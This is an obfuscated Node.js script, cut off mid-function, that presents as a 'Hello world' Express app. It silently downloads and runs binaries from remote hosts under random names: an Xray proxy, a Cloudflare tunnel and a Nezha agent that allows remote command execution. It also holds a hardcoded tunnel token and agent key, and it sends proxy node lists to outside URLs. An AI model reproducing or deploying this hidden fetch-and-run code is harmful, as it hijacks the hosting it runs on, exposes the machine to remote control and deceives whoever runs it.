const _0x36cf95=_0x5242;(function(_0x3c330b,_0x18d1d4){const _0x589dbf={_0x6527f4:0x155,_0x549733:0x140,_0x3926a6:0x1ba,_0x1c3d65:0x18e,_0x4700a2:0x1ad},_0x2cc61d=_0x5242,_0x2b77d9=_0x3c330b();while(!![]){try{const _0x147e8a=-parseInt(_0x2cc61d(_0x589dbf._0x6527f4))/0x1+-parseInt(_0x2cc61d(_0x589dbf._0x549733))/0x2*(parseInt(_0x2cc61d(_0x589dbf._0x3926a6))/0x3)+parseInt(_0x2cc61d(0x172))/0x4+-parseInt(_0x2cc61d(0x18c))/0x5+parseInt(_0x2cc61d(0x1c3))/0x6*(parseInt(_0x2cc61d(0x1bc))/0x7)+-parseInt(_0x2cc61d(_0x589dbf._0x1c3d65))/0x8*(-parseInt(_0x2cc61d(_0x589dbf._0x4700a2))/0x9)+parseInt(_0x2cc61d(0x185))/0xa;if(_0x147e8a===_0x18d1d4)break;else _0x2b77d9['push'](_0x2b77d9['shift']());}catch(_0x2b63d6){_0x2b77d9['push'](_0x2b77d9['shift']());}}}(_0x2f6c,0x1aa54));const express=require(_0x36cf95(0x1a8)),app=express(),axios=require(_0x36cf95(0x1ab)),os=require('os'),fs=require('fs'),path=require(_0x36cf95(0x122)),{promisify}=require(_0x36cf95(0x1a0)),exec=promisify(require(_0x36cf95(0x195))[_0x36cf95(0x15b)]),{execSync}=require(_0x36cf95(0x195)),UPLOAD_URL=process['env'][_0x36cf95(0x15a)]||'',PROJECT_URL=process[_0x36cf95(0x11b)][_0x36cf95(0x12a)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x36cf95(0x11b)][_0x36cf95(0x1b1)]||_0x36cf95(0x198),SUB_PATH=process[_0x36cf95(0x11b)]['SUB_PATH']||_0x36cf95(0x119),PORT=process[_0x36cf95(0x11b)][_0x36cf95(0x1a7)]||process[_0x36cf95(0x11b)][_0x36cf95(0x19f)]||0xbb8,UUID=process[_0x36cf95(0x11b)][_0x36cf95(0x16e)]||'5c83d0ac-7006-4e7c-9adf-b0c8e8a8d656',NEZHA_SERVER=process[_0x36cf95(0x11b)][_0x36cf95(0x16d)]||_0x36cf95(0x178),NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x36cf95(0x11b)][_0x36cf95(0x11f)]||_0x36cf95(0x165),ARGO_DOMAIN=process[_0x36cf95(0x11b)][_0x36cf95(0x18a)]||_0x36cf95(0x121),ARGO_AUTH=process[_0x36cf95(0x11b)][_0x36cf95(0x1cd)]||'eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiNWY0MjgwNmQtZjZhMi00Nzk5LThmMWQtOWM1YjVkNmU2MTVkIiwicyI6Ik9UYzFZVGN6WmpndFpETmlZUzAwTkROakxUa3dNRGt0TlROaFpHVmtNelUwTnpnNSJ9',ARGO_PORT=process[_0x36cf95(0x11b)][_0x36cf95(0x190)]||0x1f41,CFIP=process[_0x36cf95(0x11b)][_0x36cf95(0x19c)]||_0x36cf95(0x1aa),CFPORT=process[_0x36cf95(0x11b)][_0x36cf95(0x1bd)]||0x1bb,NAME=process[_0x36cf95(0x11b)][_0x36cf95(0x15c)]||_0x36cf95(0x157);!fs['existsSync'](FILE_PATH)?(fs[_0x36cf95(0x1d1)](FILE_PATH),console[_0x36cf95(0x13a)](FILE_PATH+_0x36cf95(0x148))):console[_0x36cf95(0x13a)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x31a6cc={_0x33f07d:0x1ae,_0x591d04:0x1cf,_0x930325:0x14a},_0xaf32fc=_0x36cf95,_0x50d84d=_0xaf32fc(0x11e);let _0x25b9db='';for(let _0x408bfa=0x0;_0x408bfa<0x6;_0x408bfa++){_0x25b9db+=_0x50d84d[_0xaf32fc(_0x31a6cc._0x33f07d)](Math[_0xaf32fc(_0x31a6cc._0x591d04)](Math[_0xaf32fc(_0x31a6cc._0x930325)]()*_0x50d84d['length']));}return _0x25b9db;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x36cf95(0x14e)](FILE_PATH,npmName),phpPath=path[_0x36cf95(0x14e)](FILE_PATH,phpName),webPath=path[_0x36cf95(0x14e)](FILE_PATH,webName),botPath=path[_0x36cf95(0x14e)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x36cf95(0x14e)](FILE_PATH,_0x36cf95(0x167)),bootLogPath=path['join'](FILE_PATH,_0x36cf95(0x1a4)),configPath=path[_0x36cf95(0x14e)](FILE_PATH,_0x36cf95(0x1b7));function deleteNodes(){const _0x2dac8c={_0x544953:0x153,_0x2795dd:0x180,_0x25aab7:0x18f,_0x4297fd:0x118},_0x274dca=_0x36cf95;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x44e5d8;try{_0x44e5d8=fs[_0x274dca(0x142)](subPath,_0x274dca(_0x2dac8c._0x544953));}catch{return null;}const _0x4d3a60=Buffer['from'](_0x44e5d8,'base64')[_0x274dca(0x156)]('utf-8'),_0x40c6dc=_0x4d3a60['split']('\x0a')[_0x274dca(0x143)](_0x1f767b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x274dca(0x1be)](_0x1f767b));if(_0x40c6dc[_0x274dca(0x175)]===0x0)return;return axios[_0x274dca(_0x2dac8c._0x2795dd)](UPLOAD_URL+_0x274dca(_0x2dac8c._0x25aab7),JSON[_0x274dca(_0x2dac8c._0x4297fd)]({'nodes':_0x40c6dc}),{'headers':{'Content-Type':_0x274dca(0x16c)}})[_0x274dca(0x192)](_0x302731=>{return null;}),null;}catch(_0x12a63a){return null;}}function cleanupOldFiles(){const _0x1663db={_0x4ad651:0x14e};try{const _0x8a7e32=fs['readdirSync'](FILE_PATH);_0x8a7e32['forEach'](_0x328d59=>{const _0x519315=_0x5242,_0x24068c=path[_0x519315(_0x1663db._0x4ad651)](FILE_PATH,_0x328d59);try{const _0x2c7ac1=fs['statSync'](_0x24068c);_0x2c7ac1[_0x519315(0x127)]()&&fs[_0x519315(0x131)](_0x24068c);}catch(_0x446202){}});}catch(_0x18bff5){}}app['get']('/',function(_0x59f69e,_0x1ffa79){_0x1ffa79['send']('Hello\x20world!');});async function generateConfig(){const _0x472325={_0x139e1e:0x168,_0x8a59d:0x16f,_0x3e0e41:0x199,_0x4c84e5:0x1c9,_0x1d4ff6:0x17c,_0x59f876:0x169,_0x5c7968:0x1b5,_0x2b90a0:0x1c4,_0x187b5d:0x1c7,_0x167454:0x137,_0x5ad2b7:0x183,_0x3ef221:0x144,_0x552330:0x1b7,_0x1b8948:0x118},_0x31cef5=_0x36cf95,_0x219345={'log':{'access':_0x31cef5(0x17f),'error':'/dev/null','loglevel':_0x31cef5(0x199)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x31cef5(_0x472325._0x139e1e),'settings':{'clients':[{'id':UUID,'flow':_0x31cef5(_0x472325._0x8a59d)}],'decryption':_0x31cef5(_0x472325._0x3e0e41),'fallbacks':[{'dest':0xbb9},{'path':_0x31cef5(_0x472325._0x4c84e5),'dest':0xbba},{'path':_0x31cef5(0x169),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x31cef5(0x14c)}},{'port':0xbb9,'listen':_0x31cef5(0x150),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x31cef5(_0x472325._0x3e0e41)},'streamSettings':{'network':'tcp','security':_0x31cef5(_0x472325._0x3e0e41)}},{'port':0xbba,'listen':_0x31cef5(0x150),'protocol':_0x31cef5(0x168),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x31cef5(0x199)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x31cef5(_0x472325._0x1d4ff6),'tls',_0x31cef5(0x1c4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x31cef5(0x150),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x31cef5(_0x472325._0x59f876)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x31cef5(_0x472325._0x5c7968),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x31cef5(0x197),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x31cef5(_0x472325._0x3e0e41),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x31cef5(0x17c),_0x31cef5(0x1b5),_0x31cef5(_0x472325._0x2b90a0)],'metadataOnly':![]}}],'dns':{'servers':[_0x31cef5(_0x472325._0x187b5d)]},'outbounds':[{'protocol':_0x31cef5(0x15f),'tag':_0x31cef5(0x1c6)},{'protocol':_0x31cef5(_0x472325._0x167454),'tag':_0x31cef5(_0x472325._0x5ad2b7)}]};fs[_0x31cef5(_0x472325._0x3ef221)](path[_0x31cef5(0x14e)](FILE_PATH,_0x31cef5(_0x472325._0x552330)),JSON[_0x31cef5(_0x472325._0x1b8948)](_0x219345,null,0x2));}function getSystemArchitecture(){const _0x36f5e9={_0x3b8d47:0x166,_0x59f07c:0x188},_0x34dffd=_0x36cf95,_0x507e9f=os[_0x34dffd(0x1d4)]();return _0x507e9f===_0x34dffd(_0x36f5e9._0x3b8d47)||_0x507e9f===_0x34dffd(_0x36f5e9._0x59f07c)||_0x507e9f===_0x34dffd(0x145)?'arm':_0x34dffd(0x1b8);}function _0x2f6c(){const _0x2ca602=['&fp=firefox&type=ws&host=','https://ipapi.co/json/','has','https://amd64.ssss.nyc.mn/bot','\x20-p\x20','Error\x20in\x20startserver:','unlinkSync','match','Download\x20','data','\x0a\x20\x20credentials-file:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','blackhole','finish','includes','log','/api/add-nodes','\x0a\x0atrojan://','\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Error\x20executing\x20command:\x20','218xvisfe','\x20-s\x20','readFileSync','filter','writeFileSync','aarch64','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','\x20is\x20created','https://arm64.ssss.nyc.mn/v1','random','&path=%2Fvless-argo%3Fed%3D2560#','tcp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','join','\x20-c\x20','127.0.0.1','https://arm64.ssss.nyc.mn/web','org','utf-8','then','184650iLqtVm','toString','koyeb','chmod','split','UPLOAD_URL','exec','NAME','\x0avless://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','freedom','TunnelSecret','message','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/web','.exe\x20>\x20nul\x202>&1','GTmVnjnxL0bC41DDvN7UzMNqf6jAK9TM','arm','list.txt','vless','/vmess-argo','php\x20running\x20error:\x20','close','application/json','NEZHA_SERVER','UUID','xtls-rprx-vision','http\x20server\x20is\x20running\x20on\x20port:','nohup\x20','39400BAoqxP','Add\x20automatic\x20access\x20task\x20faild:\x20','all','length','2096','Unknown','144.22.159.118:8008','pop','existsSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','http','\x0a\x20\x20\x20\x20','get','/dev/null','post','push','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','block','8443','3832770eCMDVi','Error\x20downloading\x20files:','NEZHA\x20variable\x20is\x20empty,skip\x20running','arm64','\x22\x20>\x20/dev/null\x202>&1','ARGO_DOMAIN','https://arm64.ssss.nyc.mn/bot','211460fdoptA','npm\x20running\x20error:\x20','348584txwUIV','/api/delete-nodes','ARGO_PORT','base64','catch','listen','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','child_process','pkill\x20-f\x20\x22[','trojan','./tmp','none','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','CFIP','win32','forEach','PORT','util','web\x20running\x20error:\x20','\x20successfully','send','boot.log','443','fileName','SERVER_PORT','express','from','cdns.doon.eu.org','axios','https://arm64.ssss.nyc.mn/agent','27nAhksK','charAt','App\x20is\x20running','Unhandled\x20error\x20in\x20startserver:','FILE_PATH','?encryption=none&security=tls&sni=','\x20is\x20running','Subscription\x20uploaded\x20successfully','tls','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','config.json','amd','\x20>/dev/null\x202>&1\x20&','5532RXYDDI','/api/add-subscriptions','23156LcTqcX','CFPORT','test','country_code','2083','Nodes\x20uploaded\x20successfully','status','24KUOCdX','quic','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','direct','https+local://8.8.8.8/dns-query','automatic\x20access\x20task\x20added\x20successfully','/vless-argo','true','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','rm\x20-rf\x20','ARGO_AUTH','2053','floor','basename','mkdirSync','Skipping\x20adding\x20automatic\x20access\x20task','text/plain;\x20charset=utf-8','arch','stringify','sub','\x20-c\x20\x22','env','unshift','error','abcdefghijklmnopqrstuvwxyz','NEZHA_KEY','response','us.rtyuoi.ggff.net','path','false','Empowerment\x20success\x20for\x20','Content-Type','clear','isFile','https://oooo.serv00.net/add-url','/sub.txt\x20saved\x20successfully','PROJECT_URL'];_0x2f6c=function(){return _0x2ca602;};return _0x2f6c();}function downloadFile(_0xaac85e,_0x282638,_0x1d5319){const _0xf5e29a={_0x26824c:0x17a},_0x498e03={_0x1689a0:0x134,_0x5f43b4:0x138},_0x3fa264={_0x2b5a10:0x133,_0x35543b:0x161},_0x2af8cc=_0x36cf95,_0x343f89=_0xaac85e;!fs[_0x2af8cc(_0xf5e29a._0x26824c)](FILE_PATH)&&fs[_0x2af8cc(0x1d1)](FILE_PATH,{'recursive':!![]});const _0x251709=fs['createWriteStream'](_0x343f89);axios({'method':'get','url':_0x282638,'responseType':'stream'})[_0x2af8cc(0x154)](_0x53ea70=>{const _0x343589={_0x26f7be:0x13a},_0x4083e3=_0x2af8cc;_0x53ea70[_0x4083e3(_0x498e03._0x1689a0)]['pipe'](_0x251709),_0x251709['on'](_0x4083e3(_0x498e03._0x5f43b4),()=>{const _0x3e43ba=_0x4083e3;_0x251709[_0x3e43ba(0x16b)](),console[_0x3e43ba(_0x343589._0x26f7be)]('Download\x20'+path[_0x3e43ba(0x1d0)](_0x343f89)+_0x3e43ba(0x1a2)),_0x1d5319(null,_0x343f89);}),_0x251709['on'](_0x4083e3(0x11d),_0x354e6b=>{const _0x196bf5=_0x4083e3;fs['unlink'](_0x343f89,()=>{});const _0x517625=_0x196bf5(_0x3fa264._0x2b5a10)+path['basename'](_0x343f89)+'\x20failed:\x20'+_0x354e6b[_0x196bf5(_0x3fa264._0x35543b)];console[_0x196bf5(0x11d)](_0x517625),_0x1d5319(_0x517625);});})[_0x2af8cc(0x192)](_0xe5c3bc=>{const _0x56cff6=_0x2af8cc,_0x33fe8b='Download\x20'+path[_0x56cff6(0x1d0)](_0x343f89)+'\x20failed:\x20'+_0xe5c3bc['message'];console[_0x56cff6(0x11d)](_0x33fe8b),_0x1d5319(_0x33fe8b);});}async function downloadFilesAndRun(){const _0x4dfbcf={_0x44e524:0x15e,_0x5da8f5:0x174,_0x445995:0x11d,_0x4af502:0x186,_0x46e4eb:0x159,_0xfc17ac:0x179,_0x4156fb:0x1ce,_0x3aa767:0x12d,_0x7384de:0x1b6,_0x1852e3:0x144,_0x463795:0x171,_0xabbb53:0x11a,_0x388a7d:0x146,_0x22811f:0x176,_0x23edf5:0x19a,_0x1c7a52:0x141,_0x158806:0x1c5,_0x3d52db:0x18d,_0x54656c:0x187,_0x44dec1:0x1a1,_0x3a710e:0x17a,_0x57ce69:0x19b,_0x5c859c:0x132,_0x4107a4:0x162,_0x4c8641:0x171,_0x30f056:0x1b9,_0x2ec9ca:0x13a,_0x5d7779:0x1b3,_0x247ad4:0x13f},_0x520c60={_0x37ef59:0x19e},_0x407a70={_0x6704e8:0x1a6},_0x57b43f=_0x36cf95,_0x4e35af=getSystemArchitecture(),_0x14a4ee=getFilesForArchitecture(_0x4e35af);if(_0x14a4ee['length']===0x0){console['log'](_0x57b43f(_0x4dfbcf._0x44e524));return;}const _0x25831e=_0x14a4ee['map'](_0x2946d9=>{return new Promise((_0x391727,_0x37daa1)=>{const _0xdac4=_0x5242;downloadFile(_0x2946d9[_0xdac4(_0x407a70._0x6704e8)],_0x2946d9['fileUrl'],(_0x31889d,_0x2fb356)=>{_0x31889d?_0x37daa1(_0x31889d):_0x391727(_0x2fb356);});});});try{await Promise[_0x57b43f(_0x4dfbcf._0x5da8f5)](_0x25831e);}catch(_0x5086b3){console[_0x57b43f(_0x4dfbcf._0x445995)](_0x57b43f(_0x4dfbcf._0x4af502),_0x5086b3);return;}function _0x4a4cb9(_0x39f745){const _0x4cfe22={_0xf58ed:0x158},_0x242438={_0x4a1c29:0x11d,_0x5730b3:0x13a,_0x3ef8da:0x124,_0x594893:0x156},_0x1ce896=_0x57b43f,_0x2384b7=0x1fd;_0x39f745[_0x1ce896(_0x520c60._0x37ef59)](_0x1df165=>{const _0x32ec1b=_0x1ce896;fs[_0x32ec1b(0x17a)](_0x1df165)&&fs[_0x32ec1b(_0x4cfe22._0xf58ed)](_0x1df165,_0x2384b7,_0x5e8b7b=>{const _0x1e4e0c=_0x32ec1b;_0x5e8b7b?console[_0x1e4e0c(_0x242438._0x4a1c29)]('Empowerment\x20failed\x20for\x20'+_0x1df165+':\x20'+_0x5e8b7b):console[_0x1e4e0c(_0x242438._0x5730b3)](_0x1e4e0c(_0x242438._0x3ef8da)+_0x1df165+':\x20'+_0x2384b7[_0x1e4e0c(_0x242438._0x594893)](0x8));});});}const _0x64db09=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4a4cb9(_0x64db09);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x552f58=NEZHA_SERVER[_0x57b43f(0x139)](':')?NEZHA_SERVER[_0x57b43f(_0x4dfbcf._0x46e4eb)](':')[_0x57b43f(_0x4dfbcf._0xfc17ac)]():'',_0x437131=new Set([_0x57b43f(0x1a5),_0x57b43f(0x184),_0x57b43f(0x176),'2087',_0x57b43f(0x1c0),_0x57b43f(_0x4dfbcf._0x4156fb)]),_0x55f1a2=_0x437131[_0x57b43f(_0x4dfbcf._0x3aa767)](_0x552f58)?_0x57b43f(0x1ca):_0x57b43f(0x123),_0x4b1ea2='\x0aclient_secret:\x20'+NEZHA_KEY+_0x57b43f(0x182)+NEZHA_SERVER+_0x57b43f(_0x4dfbcf._0x7384de)+_0x55f1a2+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x57b43f(_0x4dfbcf._0x1852e3)](path['join'](FILE_PATH,'config.yaml'),_0x4b1ea2);const _0x452e77=_0x57b43f(_0x4dfbcf._0x463795)+phpPath+_0x57b43f(_0x4dfbcf._0xabbb53)+FILE_PATH+_0x57b43f(_0x4dfbcf._0x388a7d);try{await exec(_0x452e77),console[_0x57b43f(0x13a)](phpName+_0x57b43f(0x1b3)),await new Promise(_0x40cc5=>setTimeout(_0x40cc5,0x3e8));}catch(_0x17e3e4){console[_0x57b43f(0x11d)](_0x57b43f(0x16a)+_0x17e3e4);}}else{let _0xd73af6='';const _0x499143=['443',_0x57b43f(0x184),_0x57b43f(_0x4dfbcf._0x22811f),_0x57b43f(_0x4dfbcf._0x23edf5),_0x57b43f(0x1c0),'2053'];_0x499143['includes'](NEZHA_PORT)&&(_0xd73af6='--tls');const _0x4b1702=_0x57b43f(0x171)+npmPath+_0x57b43f(_0x4dfbcf._0x1c7a52)+NEZHA_SERVER+':'+NEZHA_PORT+_0x57b43f(0x12f)+NEZHA_KEY+'\x20'+_0xd73af6+_0x57b43f(_0x4dfbcf._0x158806);try{await exec(_0x4b1702),console['log'](npmName+_0x57b43f(0x1b3)),await new Promise(_0x4b2b94=>setTimeout(_0x4b2b94,0x3e8));}catch(_0x3f39ca){console['error'](_0x57b43f(_0x4dfbcf._0x3d52db)+_0x3f39ca);}}}else console[_0x57b43f(0x13a)](_0x57b43f(_0x4dfbcf._0x54656c));const _0x21c2da='nohup\x20'+webPath+_0x57b43f(0x14f)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x21c2da),console[_0x57b43f(0x13a)](webName+_0x57b43f(0x1b3)),await new Promise(_0x2f51ef=>setTimeout(_0x2f51ef,0x3e8));}catch(_0x5a0cc6){console[_0x57b43f(0x11d)](_0x57b43f(_0x4dfbcf._0x44dec1)+_0x5a0cc6);}if(fs[_0x57b43f(_0x4dfbcf._0x3a710e)](botPath)){let _0xadf9f6;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0xadf9f6=_0x57b43f(_0x4dfbcf._0x57ce69)+ARGO_AUTH;else ARGO_AUTH[_0x57b43f(_0x4dfbcf._0x5c859c)](/TunnelSecret/)?_0xadf9f6='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0xadf9f6=_0x57b43f(_0x4dfbcf._0x4107a4)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x57b43f(_0x4dfbcf._0x4c8641)+botPath+'\x20'+_0xadf9f6+_0x57b43f(_0x4dfbcf._0x30f056)),console[_0x57b43f(_0x4dfbcf._0x2ec9ca)](botName+_0x57b43f(_0x4dfbcf._0x5d7779)),await new Promise(_0x37122e=>setTimeout(_0x37122e,0x7d0));}catch(_0x3ba722){console[_0x57b43f(0x11d)](_0x57b43f(_0x4dfbcf._0x247ad4)+_0x3ba722);}}await new Promise(_0x39137b=>setTimeout(_0x39137b,0x1388));}function getFilesForArchitecture(_0x1a71ef){const _0x1f6bef={_0x362d13:0x18b,_0x2f1c59:0x163,_0xaea2db:0x12e,_0x39a8ed:0x166,_0x40c2cc:0x1ac,_0x5e5589:0x11c,_0xf24cb1:0x147},_0x7b9118=_0x36cf95;let _0x4514e9;_0x1a71ef==='arm'?_0x4514e9=[{'fileName':webPath,'fileUrl':_0x7b9118(0x151)},{'fileName':botPath,'fileUrl':_0x7b9118(_0x1f6bef._0x362d13)}]:_0x4514e9=[{'fileName':webPath,'fileUrl':_0x7b9118(_0x1f6bef._0x2f1c59)},{'fileName':botPath,'fileUrl':_0x7b9118(_0x1f6bef._0xaea2db)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4968ce=_0x1a71ef===_0x7b9118(_0x1f6bef._0x39a8ed)?_0x7b9118(_0x1f6bef._0x40c2cc):'https://amd64.ssss.nyc.mn/agent';_0x4514e9[_0x7b9118(_0x1f6bef._0x5e5589)]({'fileName':npmPath,'fileUrl':_0x4968ce});}else{const _0x4b1d08=_0x1a71ef===_0x7b9118(_0x1f6bef._0x39a8ed)?_0x7b9118(0x149):_0x7b9118(_0x1f6bef._0xf24cb1);_0x4514e9[_0x7b9118(0x11c)]({'fileName':phpPath,'fileUrl':_0x4b1d08});}}return _0x4514e9;}function argoType(){const _0x58385c={_0x25d8df:0x13a,_0x2dfa85:0x1cb,_0x246beb:0x144,_0x46909b:0x144,_0x51d6c9:0x17b},_0x262e0a=_0x36cf95;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x262e0a(_0x58385c._0x25d8df)](_0x262e0a(_0x58385c._0x2dfa85));return;}if(ARGO_AUTH['includes'](_0x262e0a(0x160))){fs[_0x262e0a(_0x58385c._0x246beb)](path[_0x262e0a(0x14e)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x122a8e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x262e0a(0x159)]('\x22')[0xb]+_0x262e0a(0x135)+path[_0x262e0a(0x14e)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x262e0a(0x13e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x262e0a(_0x58385c._0x46909b)](path[_0x262e0a(0x14e)](FILE_PATH,'tunnel.yml'),_0x122a8e);}else console['log'](_0x262e0a(_0x58385c._0x51d6c9));}function _0x5242(_0x1d8e0f,_0x442153){const _0x2f6ce8=_0x2f6c();return _0x5242=function(_0x5242d3,_0x506971){_0x5242d3=_0x5242d3-0x118;let _0x27b6b8=_0x2f6ce8[_0x5242d3];return _0x27b6b8;},_0x5242(_0x1d8e0f,_0x442153);}async function extractDomains(){const _0x25773d={_0x212c5a:0x142,_0x390edd:0x14e,_0x13599c:0x153,_0x1399ba:0x194,_0x38a794:0x11d},_0x332c84={_0x3f32b9:0x12c,_0x142e35:0x134,_0x47d5ae:0x152,_0x4a9487:0x134,_0x560fa5:0x152},_0x45bcf9={_0x3d1c93:0x196,_0x26bb8b:0x1ae,_0x4fe0f9:0x189},_0x44cef4={_0x126a5e:0x132,_0xe9dac5:0x181},_0x2e6fea=_0x36cf95;let _0x16fbe0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x16fbe0=ARGO_DOMAIN,console[_0x2e6fea(0x13a)]('ARGO_DOMAIN:',_0x16fbe0),await _0x2eaff7(_0x16fbe0);else try{const _0x57d27a=fs[_0x2e6fea(_0x25773d._0x212c5a)](path[_0x2e6fea(_0x25773d._0x390edd)](FILE_PATH,_0x2e6fea(0x1a4)),_0x2e6fea(_0x25773d._0x13599c)),_0x58a0b8=_0x57d27a['split']('\x0a'),_0x138c7f=[];_0x58a0b8[_0x2e6fea(0x19e)](_0x4394df=>{const _0x3db74b=_0x2e6fea,_0x37dddf=_0x4394df[_0x3db74b(_0x44cef4._0x126a5e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x37dddf){const _0x305d10=_0x37dddf[0x1];_0x138c7f[_0x3db74b(_0x44cef4._0xe9dac5)](_0x305d10);}});if(_0x138c7f['length']>0x0)_0x16fbe0=_0x138c7f[0x0],console[_0x2e6fea(0x13a)]('ArgoDomain:',_0x16fbe0),await _0x2eaff7(_0x16fbe0);else{console[_0x2e6fea(0x13a)](_0x2e6fea(_0x25773d._0x1399ba)),fs[_0x2e6fea(0x131)](path[_0x2e6fea(0x14e)](FILE_PATH,'boot.log'));async function _0x9b0cb7(){const _0x2a6ae9=_0x2e6fea;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x2a6ae9(0x164)):await exec(_0x2a6ae9(_0x45bcf9._0x3d1c93)+botName[_0x2a6ae9(_0x45bcf9._0x26bb8b)](0x0)+']'+botName['substring'](0x1)+_0x2a6ae9(_0x45bcf9._0x4fe0f9));}catch(_0x5a5482){}}_0x9b0cb7(),await new Promise(_0x8e3ab2=>setTimeout(_0x8e3ab2,0xbb8));const _0x31e3b3=_0x2e6fea(0x162)+FILE_PATH+_0x2e6fea(0x136)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x31e3b3+_0x2e6fea(0x1b9)),console[_0x2e6fea(0x13a)](botName+_0x2e6fea(0x1b3)),await new Promise(_0x18dcf8=>setTimeout(_0x18dcf8,0xbb8)),await extractDomains();}catch(_0x133604){console[_0x2e6fea(_0x25773d._0x38a794)]('Error\x20executing\x20command:\x20'+_0x133604);}}}catch(_0x34cec6){console['error']('Error\x20reading\x20boot.log:',_0x34cec6);}async function _0x79c8e1(){const _0xc3a0ee=_0x2e6fea;try{const _0x8327b4=await axios['get'](_0xc3a0ee(_0x332c84._0x3f32b9),{'timeout':0xbb8});if(_0x8327b4[_0xc3a0ee(0x134)]&&_0x8327b4[_0xc3a0ee(_0x332c84._0x142e35)][_0xc3a0ee(0x1bf)]&&_0x8327b4[_0xc3a0ee(_0x332c84._0x142e35)][_0xc3a0ee(_0x332c84._0x47d5ae)])return _0x8327b4['data'][_0xc3a0ee(0x1bf)]+'_'+_0x8327b4[_0xc3a0ee(0x134)][_0xc3a0ee(0x152)];}catch(_0x2185ff){try{const _0x58bcac=await axios[_0xc3a0ee(0x17e)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x58bcac[_0xc3a0ee(0x134)]&&_0x58bcac[_0xc3a0ee(_0x332c84._0x142e35)]['status']==='success'&&_0x58bcac[_0xc3a0ee(_0x332c84._0x4a9487)]['countryCode']&&_0x58bcac[_0xc3a0ee(_0x332c84._0x4a9487)][_0xc3a0ee(_0x332c84._0x47d5ae)])return _0x58bcac[_0xc3a0ee(0x134)]['countryCode']+'_'+_0x58bcac['data'][_0xc3a0ee(_0x332c84._0x560fa5)];}catch(_0x29e64c){}}return _0xc3a0ee(0x177);}async function _0x2eaff7(_0x5f3f8b){const 